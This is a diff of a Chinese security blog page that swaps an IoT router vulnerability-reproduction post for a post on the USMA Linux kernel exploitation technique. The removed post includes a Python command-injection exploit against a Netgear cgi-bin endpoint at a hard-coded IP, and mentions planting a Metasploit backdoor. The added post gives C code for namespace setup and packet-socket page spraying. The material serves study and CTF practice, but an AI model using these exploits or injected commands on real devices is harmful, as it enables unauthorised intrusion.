@@ -16,26 +16,29 @@
   <meta name="author" content="korey0sh1">
   <meta name="keywords" content="">
   
-    <meta name="description" content="折磨">
+    <meta name="description" content="unlimited write chances to any address &amp;&amp; under version 6.2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="iot漏洞复现小记">
-<meta property="og:url" content="http://example.com/2023/08/05/iot%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="USMA">
+<meta property="og:url" content="http://example.com/2024/02/23/USMA/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="折磨">
+<meta property="og:description" content="unlimited write chances to any address &amp;&amp; under version 6.2">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/iot1/index.jpg">
-<meta property="article:published_time" content="2023-08-05T00:17:35.000Z">
-<meta property="article:modified_time" content="2024-01-06T00:23:51.156Z">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123320.png">
+<meta property="article:published_time" content="2024-02-23T13:04:58.000Z">
+<meta property="article:modified_time" content="2024-02-27T12:04:44.254Z">
 <meta property="article:author" content="korey0sh1">
-<meta property="article:tag" content="Iot">
+<meta property="article:tag" content="OS">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/iot1/index.jpg">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123320.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>iot漏洞复现小记 - Hexo</title>
+  <title>USMA - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -234,13 +237,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/iot1/banner.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/116070526_p0_master1200.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="iot漏洞复现小记"></span>
+            <span id="subtitle" data-typed-text="USMA"></span>
           
         </div>
 
@@ -256,8 +259,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-05 08:17" pubdate>
-          2023年8月5日 早上
+        <time datetime="2024-02-23 21:04" pubdate>
+          2024年2月23日 晚上
         </time>
       </span>
     
@@ -268,7 +271,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          694 字
+          353 字
         
       </span>
     
@@ -315,12 +318,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">iot漏洞复现小记</h1>
+            <h1 id="seo-header">USMA</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年1月6日 早上
+                    本文最后更新于：2024年2月27日 晚上
                   
                 
               </p>
@@ -328,56 +331,31 @@
             
               <div class="markdown-body">
                 
-                <h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>直接莽漏洞复现了</p>
-<p>搞了个iotsec的账号，这边复现的主要是里面iot靶场里的洞</p>
-<p>总感觉他TM靶机有大问题，所以笔者这记录的全为本地remake</p>
-<h1 id="0x1-大致的漏洞挖掘流程"><a href="#0x1-大致的漏洞挖掘流程" class="headerlink" title="0x1: 大致的漏洞挖掘流程"></a>0x1: 大致的漏洞挖掘流程</h1><p>笔者希望在这二三十个漏洞复现完后能总结出一个高效率的iot漏洞挖掘流程</p>
-<p>但暂时还没什么灵感呜呜呜呜</p>
-<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>8-10，July：试了几个后门漏洞，先用firmwalker看看有没有敏感文件</p>
-<p>10-15，July：挖了totolink T10，熟悉了以mqtt为主题的webserver</p>
-<p>17-20，July：totolink A720R，totolink大量存在的未授权认证漏洞，以及以http为主体的webserver，cstecgi.cgi</p>
-<p>8-13，August：Tenda AX3，patch binary of httpd来启动webserver，很正常的服务</p>
-<p>15-17，August：一系列DLINK设备存在的问题，牵扯到upnp协议，用qemu很麻烦，所以笔者直接用FirmAE进行模拟，且FirmAE的-d模式能拿shell和patch pid调试，对于类似cgi这类存在时间很短的进程，winmt师傅的方法是patch掉一个地方，使程序进入无限循环从而使进程卡住，绝妙的想法！！</p>
-<h1 id="0x2-Remake"><a href="#0x2-Remake" class="headerlink" title="0x2: Remake"></a>0x2: Remake</h1><h2 id="后门漏洞"><a href="#后门漏洞" class="headerlink" title="后门漏洞"></a>后门漏洞</h2><p>这种纯纯就是福利姬（好像有点奇怪，但这么说是一点问题没有）</p>
-<h3 id="D-Link-DIR815后门漏洞"><a href="#D-Link-DIR815后门漏洞" class="headerlink" title="D-Link DIR815后门漏洞"></a>D-Link DIR815后门漏洞</h3><p>拿firmwalker一扫发现存在&#x2F;etc&#x2F;init0.d&#x2F;S80telnetd.sh</p>
-<p><img src="/img/iot1/0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>然后就telnet访问一下就好了</p>
-<p>抽象的一批</p>
-<h3 id="ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞"><a href="#ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞" class="headerlink" title="ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞"></a>ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞</h3><p>firmwalker扫完没什么发现</p>
-<p>找一下固件中有没有syscmd这种敏感字符串，还真有</p>
-<p><img src="/img/iot1/1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>那用FirmAE模拟一下，试着访问一下这个Main_AdmStatus_Content.asp</p>
-<p><img src="/img/iot1/2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>随便搞</p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Tenda-AC15命令执行（goform-setUsbUnload）"><a href="#Tenda-AC15命令执行（goform-setUsbUnload）" class="headerlink" title="Tenda AC15命令执行（goform&#x2F;setUsbUnload）"></a>Tenda AC15命令执行（goform&#x2F;setUsbUnload）</h3><p>TendaAC15老朋友了，先把httpd服务起起来</p>
-<p>goform，很眼熟，估计起web服务的是gohead</p>
-<p>漏洞描述都说是在setUsbUnload了，在httpd搜一下字符串</p>
-<p><img src="/img/iot1/3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>啊这，没有任何过滤，那就直接搞个POST请求看一下</p>
-<p><img src="/img/iot1/4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/iot1/5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="DIR818L命令执行-（-etc-script-IPV4-INET-PHP）"><a href="#DIR818L命令执行-（-etc-script-IPV4-INET-PHP）" class="headerlink" title="DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）"></a>DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）</h3><p>捏麻麻滴</p>
-<p>审了半天，看了wp才知道是web洞，会不了一点</p>
-<p>而且这个网路服务是HNAP1，SOAP协议的，xml语言看起来挺好懂得，就是这个功能API实在是太折磨了</p>
-<h3 id="ASUS-RT-N10U-（ping-过滤不严）"><a href="#ASUS-RT-N10U-（ping-过滤不严）" class="headerlink" title="ASUS RT-N10U （ping 过滤不严）"></a>ASUS RT-N10U （ping 过滤不严）</h3><p>好像Ping命令检测网络联通性的地方挺容易出现RCE的</p>
-<p>burp抓个包看看是什么情况</p>
-<p><img src="/img/iot1/6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>？SystemCmd，那就按照特定字符串搜一下，定位到&#x2F;usr&#x2F;sbin&#x2F;httpd，在里面找到了对应的函数</p>
-<p><img src="/img/iot1/7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>sys_script</p>
-<p><img src="/img/iot1/8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以看到，用get_cgi接受SystemCmd参数后，虽然有一点过滤。但是反引号**&#96; $()**这些内敛执行绕过并没有过滤掉</p>
-<p>将V7拷贝到位于bss段的SystemCmd后，就直接用sys_script直接执行了，所以就是一个很简单的RCE</p>
-<p>传了个msf生成的backdoor</p>
-<p><img src="/img/iot1/9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）"><a href="#Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）" class="headerlink" title="Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）"></a>Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）</h3><p>登录认证的时候没有对Authorization进行check</p>
-<p>漏洞可以直接定位到&#x2F;usr&#x2F;sbin&#x2F;uhttpd中的<code>uh_cgi_auth_check</code></p>
-<p><img src="/img/iot1/10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>逻辑很简单，接收到Authorization的内容后，把<code>Basic </code>后的内容base64解密，并把password拼接后执行</p>
-<p>本意是想把password的hash值保存到文件中，却因为过滤不严导致rce</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = &quot;http://81.68.182.195:56898/cgi-bin&quot;<br>cmd = base64.b64encode(b&quot;admin:;ls /&gt;/www/cmd.txt;&quot;)<br><br>headers=&#123;<br>    &quot;Host&quot;: &quot;81.68.182.195:56898&quot;,<br>    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,<br>    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;,<br>    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,<br>    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,<br>    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;,<br>    &quot;Connection&quot;: &quot;keep-alive&quot;,<br>    &quot;Authorization&quot;: b&quot;Basic &quot; + cmd,<br>&#125;<br># payload = &quot;ls &gt;/www/ls.txt&quot;<br># res = requests.<span class="hljs-keyword">get</span>(url=url,auth=(&quot;admin&quot;,payload))<br># print(res.text)<br>res = requests.<span class="hljs-keyword">get</span>(url=url,headers=headers,timeout=<span class="hljs-number">1</span>)<br>print(res.text)<br></code></pre></td></tr></table></figure>
+                <h1 id="0x00：写在所有之前"><a href="#0x00：写在所有之前" class="headerlink" title="0x00：写在所有之前"></a>0x00：写在所有之前</h1><p>USMA（User-Space-Mapping-Attack)，即用户态映射攻击，是360漏洞研究院于2022年提出的一个攻击手法，<a target="_blank" rel="noopener" href="https://vul.360.net/archives/391">原文博客链接</a></p>
+<p>笔者觉得十分的有趣 &amp; NB，故记录</p>
+<h1 id="0x01：what’s-USMA"><a href="#0x01：what’s-USMA" class="headerlink" title="0x01：what’s  USMA"></a>0x01：what’s  USMA</h1><p>可以参考这篇文章[CVE-2022-34918 netfilter 分析笔记 (veritas501.github.io)](<a target="_blank" rel="noopener" href="https://veritas501.github.io/2022_08_02-CVE-2022-34918">https://veritas501.github.io/2022_08_02-CVE-2022-34918</a> netfilter 分析笔记&#x2F;)</p>
+<p>先来看一下源码哈</p>
+<p>熟悉linux kernel page fengshui的朋友一定知晓通过raw_packet来申请大量page，大致的函数调用链是这样的（来自A3👴）</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">__sys_setsockopt</span>()<br>    sock-&gt;ops-&gt;<span class="hljs-built_in">setsockopt</span>()<br>    	<span class="hljs-built_in">packet_setsockopt</span>() <span class="hljs-comment">// case PACKET_TX_RING ↓</span><br>    		<span class="hljs-built_in">packet_set_ring</span>()<br>    			<span class="hljs-built_in">alloc_pg_vec</span>()<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/iot1/11.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然而在使用<code>setsockopt()</code> 进行页喷射的方法时，指定的VERSION是TPACKET_V1 or TPACKET_V2。使用USMA需要进入这个packet_set_ring的这个分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">case</span> TPACKET_V3:<br>			<span class="hljs-comment">/* Block transmit is not supported yet */</span><br>			<span class="hljs-keyword">if</span> (!tx_ring) &#123;<br>				init_prb_bdqc(po, rb, pg_vec, req_u);<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				<span class="hljs-keyword">struct</span> tpacket_req3 *req3 = &amp;req_u-&gt;req3;<br><br>				<span class="hljs-keyword">if</span> (req3-&gt;tp_retire_blk_tov ||<br>				    req3-&gt;tp_sizeof_priv ||<br>				    req3-&gt;tp_feature_req_word) &#123;<br>					err = -EINVAL;<br>					<span class="hljs-keyword">goto</span> out_free_pg_vec;<br>				&#125;<br>			&#125;<br>			<span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>
+
+<p>所以需要指定的VERSION是PACKET_V3。</p>
+<p>另一个需要注意的点是，在提交PACKET_TX_RING或者PACKET_RX_RING时，这两个对于结构体req3的参数设置要求是不一样的。</p>
+<p>RX可以随便设置，而对于 <code>TX</code> 环（即发送环），函数 <code>packet_set_ring</code> 会执行特殊处理以确保正确性。具体而言，在 <code>TPACKET_V3</code> 版本下，<code>TX</code> 环不支持基于块的操作，因此函数会进行相应的检查和处理，主要有以下几个方面：函数会检查 <code>req3</code> 结构体中的一些参数，如 <code>tp_retire_blk_tov</code>（块的超时时间）、<code>tp_sizeof_priv</code>（私有数据大小）、<code>tp_feature_req_word</code>（特性请求字），如果这些参数不为零，会返回 <code>EINVAL</code> 错误，因为 <code>TX</code> 环不支持基于块的操作。</p>
+<h1 id="0x02：模板"><a href="#0x02：模板" class="headerlink" title="0x02：模板"></a>0x02：模板</h1><p>开启匿名空间（因为setsockopt需要root权限才能操作）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">init_namespace</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">0x100</span>];<br><br>    <span class="hljs-type">uid_t</span> uid = getuid();<br>    <span class="hljs-type">gid_t</span> gid = getgid();<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER | CLONE_NEWNS)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWUSER | CLONE_NEWNS)&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET)) &#123;<br>        err_exit(<span class="hljs-string">&quot;unshare(CLONE_NEWNET)&quot;</span>);<br>    &#125;<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;deny&quot;</span>);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br><br>    fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(buff, <span class="hljs-keyword">sizeof</span>(buff), <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    write(fd, buff, <span class="hljs-built_in">strlen</span>(buff));<br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>PS：这边存放pg_vec的size&#x3D;&#x3D;block_nr*8，所以要劫持pg_vec的只需要设置相应数量的block_nr就行了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> ETH_P_ALL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ETH_P_ALL 0x0003</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">packet_socket_rx_ring_init</span><span class="hljs-params">(<span class="hljs-type">int</span> s, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_size,</span><br><span class="hljs-params">                                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> frame_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr,</span><br><span class="hljs-params">                                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sizeof_priv, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> timeout)</span> &#123;<br>    <span class="hljs-type">int</span> v = TPACKET_V3;<br>    <span class="hljs-type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="hljs-keyword">sizeof</span>(v));<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req3</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = block_size;<br>    req.tp_frame_size = frame_size;<br>    req.tp_block_nr = block_nr;<br>    req.tp_frame_nr = (block_size * block_nr) / frame_size;<br>    req.tp_retire_blk_tov = timeout;<br>    req.tp_sizeof_priv = sizeof_priv;<br>    req.tp_feature_req_word = <span class="hljs-number">0</span>;<br><br>    rv = setsockopt(s, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">packet_socket_setup</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> frame_size,</span><br><span class="hljs-params">                        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sizeof_priv, <span class="hljs-type">int</span> timeout)</span> &#123;<br>    <span class="hljs-type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));<br>    <span class="hljs-keyword">if</span> (s &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;failed at socket(AF_PACKET)&quot;</span>);<br>    &#125;<br><br>    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,<br>                               sizeof_priv, timeout);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_ll</span> <span class="hljs-title">sa</span>;</span><br>    <span class="hljs-built_in">memset</span>(&amp;sa, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(sa));<br>    sa.sll_family = PF_PACKET;<br>    sa.sll_protocol = htons(ETH_P_ALL);<br>    sa.sll_ifindex = if_nametoindex(<span class="hljs-string">&quot;lo&quot;</span>);<br>    sa.sll_hatype = <span class="hljs-number">0</span>;<br>    sa.sll_pkttype = <span class="hljs-number">0</span>;<br>    sa.sll_halen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">int</span> rv = bind(s, (<span class="hljs-keyword">struct</span> sockaddr *)&amp;sa, <span class="hljs-keyword">sizeof</span>(sa));<br>    <span class="hljs-keyword">if</span> (rv &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;failed at bind(AF_PACKET)&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pagealloc_pad</span><span class="hljs-params">(<span class="hljs-type">int</span> count, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">return</span> packet_socket_setup(size, <span class="hljs-number">0x1000</span>, count, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="0x03：做题记录"><a href="#0x03：做题记录" class="headerlink" title="0x03：做题记录"></a>0x03：做题记录</h1><p>2022 N1CTF moonpray</p>
+<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2023/04/01/230401-n1ctf2022-pwn-praymoon/">N1CTF 2022 praymoon | blingbling’s blog (blingblingxuanxuan.github.io)</a></p>
 
                 
               </div>
@@ -396,7 +374,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Iot/" class="category-chain-item">Iot</a>
+  <a href="/categories/Record-of-Learn/" class="category-chain-item">Record-of-Learn</a>
   
   
 
@@ -411,7 +389,13 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Iot/" class="print-no-link">#Iot</a>
+        <a href="/tags/OS/" class="print-no-link">#OS</a>
+      
+        <a href="/tags/linux/" class="print-no-link">#linux</a>
+      
+        <a href="/tags/kernel/" class="print-no-link">#kernel</a>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
       
     </div>
   
@@ -423,8 +407,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>iot漏洞复现小记</div>
-      <div>http://example.com/2023/08/05/iot漏洞/</div>
+      <div>USMA</div>
+      <div>http://example.com/2024/02/23/USMA/</div>
     </div>
     <div class="license-meta">
       
@@ -436,7 +420,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年8月5日</div>
+          <div>2024年2月23日</div>
         </div>
       
       
@@ -463,29 +447,6 @@
 
 
 
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2023/08/06/ASAN/" title="Address Sanitizer(投毒？投毒！)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Address Sanitizer(投毒？投毒！)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2023/07/30/Fuzz1/" title="固件模拟指北">
-                        <span class="hidden-mobile">固件模拟指北</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
               
             </div>
 
